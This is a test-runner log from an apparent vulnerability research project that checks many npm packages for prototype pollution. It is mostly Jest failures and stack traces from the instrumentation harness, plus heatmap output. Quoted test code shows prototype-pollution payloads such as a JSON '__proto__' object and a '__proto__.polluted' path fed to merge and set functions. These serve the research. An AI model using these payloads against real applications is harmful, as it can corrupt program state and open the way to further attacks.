  ● prototype pollution in @aws-sdk/shared-ini-file-loader

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/@aws-sdk/shared-ini-file-loader/dist/cjs/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in @aws-sdk/shared-ini-file-loader

    TypeError: sharedIniFileLoader.loadSharedConfigFiles is not a function

       5 |   var sharedIniFileLoader = require("@aws-sdk/shared-ini-file-loader");
       6 | 
    >  7 |   var parsed = sharedIniFileLoader.loadSharedConfigFiles({
         |                                    ^
       8 |     filepath: "./payload.toml",
       9 |   });
      10 |   parsed.then(() => {

      at Object.<anonymous> (aws-sdk-shared-ini-file-loader_1.0.0-rc.8/aws-sdk-shared-ini-file-loader.test.js:7:36)

  ● prototype pollution in @aws-sdk/shared-ini-file-loader

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.927 s
Ran all test suites matching /aws-sdk-shared-ini-file-loader_1.0.0-rc.8\/aws-sdk-shared-ini-file-loader.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'aws-sdk-shared-ini-file-loader_1.0.0-rc.8/aws-sdk-shared-ini-file-loader.test.js']' returned non-zero exit status 1.
['../prototype-pollution/total.js_3.4.6/total-js.test.js']
FAIL total.js_3.4.6/total-js.test.js
  ✕ prototype pollution in total.js (502 ms)

  ● prototype pollution in total.js

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/total.js/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in total.js

    ReferenceError: obj is not defined

      2 | test("prototype pollution in total.js", () => {
      3 |   const total = require("total.js");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (total.js_3.4.6/total-js.test.js:4:6)

  ● prototype pollution in total.js

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.391 s
Ran all test suites matching /total.js_3.4.6\/total-js.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'total.js_3.4.6/total-js.test.js']' returned non-zero exit status 1.
['../prototype-pollution/mithril_1.0.0/mithril.test.js']
FAIL mithril_1.0.0/mithril.test.js
  ✕ prototype pollution in mithril (372 ms)

  ● prototype pollution in mithril

    ReferenceError: obj is not defined

      3 |   require("mithril/test-utils/browserMock")(global);
      4 |   const m = require("mithril");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (mithril_1.0.0/mithril.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.321 s
Ran all test suites matching /mithril_1.0.0\/mithril.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'mithril_1.0.0/mithril.test.js']' returned non-zero exit status 1.
['../prototype-pollution/ini_1.3.5/ini.test.js']
FAIL ini_1.3.5/ini.test.js
  ✕ prototype pollution in ini (79 ms)

  ● prototype pollution in ini

    ReferenceError: obj is not defined

      4 |   const path = require("path");
      5 |   const ini = require("ini");
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (ini_1.3.5/ini.test.js:6:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.966 s
Ran all test suites matching /ini_1.3.5\/ini.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'ini_1.3.5/ini.test.js']' returned non-zero exit status 1.
['../prototype-pollution/mixin-deep_1.3.0/mixin-deep.test.js']
PASS mixin-deep_1.3.0/mixin-deep.test.js
  ✓ prototype pollution in mixin-deep  (79 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.966 s
Ran all test suites matching /mixin-deep_1.3.0\/mixin-deep.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 8\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/mout_1.0.0/mout.test.js']
PASS mout_1.0.0/mout.test.js
  ✓ prototype pollution in mout  (1655 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.54 s
Ran all test suites matching /mout_1.0.0\/mout.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'VERSION',    'array',\n      'collection', 'date',\n      'function',   'lang',\n      'math',       'number',\n      'object',     'queryString',\n      'random',     'string',\n      'time',       'fn'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'object' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/jointjs_2.2.1/jointjs.test.js']
PASS jointjs_2.2.1/jointjs.test.js
  ✓ prototype pollution in jointjs (4100 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.984 s
Ran all test suites matching /jointjs_2.2.1\/jointjs.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'version',              'config',\n      'dia',                  'ui',\n      'layout',               'shapes',\n      'format',               'connectors',\n      'highlighters',         'routers',\n      'anchors',              'connectionPoints',\n      'connectionStrategies', 'linkTools',\n      'mvc',                  'setTheme',\n      'env',                  'util',\n      'g',                    'Vectorizer',\n      'V'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'util' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/mergify_1.0.2/mergify.test.js']
FAIL mergify_1.0.2/mergify.test.js
  ✕ prototype pollution in mergify (29 ms)

  ● prototype pollution in mergify

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/mergify/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in mergify

    TypeError: mergify is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   mergify({}, JSON.parse(payload));
         |   ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at Object.<anonymous> (mergify_1.0.2/mergify.test.js:8:3)

  ● prototype pollution in mergify

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.926 s
Ran all test suites matching /mergify_1.0.2\/mergify.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'mergify_1.0.2/mergify.test.js']' returned non-zero exit status 1.
['../prototype-pollution/assign-deep_1.0.0/assign-deep.test.js']
PASS assign-deep_1.0.0/assign-deep.test.js
  ✓ prototype pollution in assign-deep  (58 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.004 s
Ran all test suites matching /assign-deep_1.0.0\/assign-deep.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/decal_2.0.0/decal.test.js']
FAIL decal_2.0.0/decal.test.js
  ✕ prototype pollution in decal (71 ms)

  ● prototype pollution in decal

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/decal_2.0.0/node_modules/decal/src/core/Array.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in decal

    TypeError: decal.set is not a function

      4 | 
      5 |   expect({}.polluted).toBe(undefined);
    > 6 |   decal.set({}, "__proto__.polluted", "yes");
        |         ^
      7 |   expect({}.polluted).toBe("yes");
      8 | });
      9 | 

      at Object.<anonymous> (decal_2.0.0/decal.test.js:6:9)

  ● prototype pollution in decal

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.183 s
Ran all test suites matching /decal_2.0.0\/decal.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'decal_2.0.0/decal.test.js']' returned non-zero exit status 1.
['../prototype-pollution/supermixer_1.0.3/supermixer.test.js']
FAIL supermixer_1.0.3/supermixer.test.js
  ✕ prototype pollution in supermixer (464 ms)

  ● prototype pollution in supermixer

    ReferenceError: obj is not defined

      3 | https: test("prototype pollution in supermixer", () => {
      4 |   var mixer = require("supermixer");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 |   var payload = '{"__proto__":{"polluted":"yes"}}'; //payload

      at Object.<anonymous> (supermixer_1.0.3/supermixer.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.508 s
Ran all test suites matching /supermixer_1.0.3\/supermixer.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'supermixer_1.0.3/supermixer.test.js']' returned non-zero exit status 1.
['../prototype-pollution/set-value_3.0.0/set-value.test.js']
PASS set-value_3.0.0/set-value.test.js
  ✓ prototype pollution in set-value  (67 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.938 s
Ran all test suites matching /set-value_3.0.0\/set-value.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'memo', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/fluentui-styles_0.47.15/fluentui-styles.test.js']
PASS fluentui-styles_0.47.15/fluentui-styles.test.js
  ✓ prototype pollution in @fluentui/style  (1525 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.432 s
Ran all test suites matching /fluentui-styles_0.47.15\/fluentui-styles.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'callable',\n      'createTheme',\n      'isDebugEnabled',\n      'deepmerge',\n      'mergeThemes',\n      'emptyTheme',\n      'mergeComponentVariables',\n      'mergeComponentStyles',\n      'mergeFontFaces',\n      'mergeStaticStyles',\n      'mergeStyles',\n      'mergeThemeStyles',\n      'mergeThemeVariables',\n      'mergeSiteVariables',\n      'objectKeyToValues',\n      'withDebugId'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'deepmerge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/safetydance_2.0.1/safetydance.test.js']
FAIL safetydance_2.0.1/safetydance.test.js
  ✕ prototype pollution in safetydance (57 ms)

  ● prototype pollution in safetydance

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/safetydance/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in safetydance

    ReferenceError: obj is not defined

      3 | test("prototype pollution in safetydance", () => {
      4 |   const safetydance = require("safetydance");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (safetydance_2.0.1/safetydance.test.js:5:6)

  ● prototype pollution in safetydance

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.03 s
Ran all test suites matching /safetydance_2.0.1\/safetydance.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'safetydance_2.0.1/safetydance.test.js']' returned non-zero exit status 1.
['../prototype-pollution/extend-merge_1.0.5/extend-merge.test.js']
PASS extend-merge_1.0.5/extend-merge.test.js
  ✓ prototype pollution in extend-merge (67 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.948 s
Ran all test suites matching /extend-merge_1.0.5\/extend-merge.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'extend', 'merge' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'merge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/algoliasearch-helper_3.6.0/algoliasearch-helper.test.js']
PASS algoliasearch-helper_3.6.0/algoliasearch-helper.test.js
  ✓ prototype pollution in algoliasearch-helper (486 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.36 s
Ran all test suites matching /algoliasearch-helper_3.6.0\/algoliasearch-helper.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'version',\n      'AlgoliaSearchHelper',\n      'SearchParameters',\n      'SearchResults',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'SearchParameters' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 4, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/js-data_3.0.9/js-data.test.js']
PASS js-data_3.0.9/js-data.test.js
  ✓ prototype pollution in js-data (904 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.779 s
Ran all test suites matching /js-data_3.0.9\/js-data.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'Collection', 'Component',\n      'Container',  'DataStore',\n      'Index',      'LinkedCollection',\n      'Mapper',     'Query',\n      'Record',     'Schema',\n      'Settable',   'SimpleStore',\n      'belongsTo',  'belongsToType',\n      'hasMany',    'hasManyType',\n      'hasOne',     'hasOneType',\n      'utils',      'version'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'utils' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/ianwalter-merge_9.0.1/@ianwalter-merge.test.js']
FAIL ianwalter-merge_9.0.1/@ianwalter-merge.test.js
  ✕ prototype pollution in @ianwalter/merge (28 ms)

  ● prototype pollution in @ianwalter/merge

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/@ianwalter/merge/dist/merge.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in @ianwalter/merge

    TypeError: merge is not a function

       6 | 
       7 |   let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
    >  8 |   merge({}, EVIL_JSON);
         |   ^
       9 |   expect({}.polluted).toBe("yes");
      10 | });
      11 | 

      at Object.<anonymous> (ianwalter-merge_9.0.1/@ianwalter-merge.test.js:8:3)

  ● prototype pollution in @ianwalter/merge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.908 s
Ran all test suites matching /ianwalter-merge_9.0.1\/@ianwalter-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'ianwalter-merge_9.0.1/@ianwalter-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/cookiex-deep_0.0.6/cookiex-deep.test.js']
FAIL cookiex-deep_0.0.6/cookiex-deep.test.js
  ✕ prototype pollution in @cookiex/deep (61 ms)

  ● prototype pollution in @cookiex/deep

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/@cookiex/deep/dist/assigner.js: path.node.body.body.unshift is not a function

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in @cookiex/deep

    TypeError: deep.default is not a function

      4 | 
      5 |   const target = {};
    > 6 |   deep.default(target, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
        |   ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

